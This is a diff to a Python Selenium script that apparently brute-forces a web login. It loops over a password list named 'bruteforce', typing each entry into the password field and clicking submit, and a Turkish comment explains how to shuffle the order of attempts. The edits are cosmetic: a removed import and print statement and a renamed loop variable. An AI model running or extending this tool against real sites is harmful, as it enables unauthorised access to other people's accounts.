@@ -1,4 +1,3 @@
-import random
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
@@ -23,12 +22,12 @@ wait.until(EC.presence_of_element_located((By.NAME, 'username')))
 username_field = driver.find_element(By.NAME, 'username')
 username_field.send_keys(username)
 password_field = driver.find_element(By.NAME, 'password')
-sifreText= driver.find_element(By.NAME, 'password')
+sifreText = driver.find_element(By.NAME, 'password')
 
 # Şifreleri karışık denemesi için aşağıdaki # işaretini siliniz.
 # random.shuffle(bruteforce)
-for sire in bruteforce:
-    password = sire
+for password in bruteforce:
+
     password_field.send_keys(password)
     wait.until(EC.element_to_be_clickable((By.XPATH, '//button[@type="submit"]')))
     a = 1
@@ -40,7 +39,6 @@ for sire in bruteforce:
     login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')
     login_button.click()
     time.sleep(0.1)
-    print(sire)
     password_field.send_keys(Keys.CONTROL + "a")
     password_field.send_keys(Keys.DELETE)
 driver.quit()
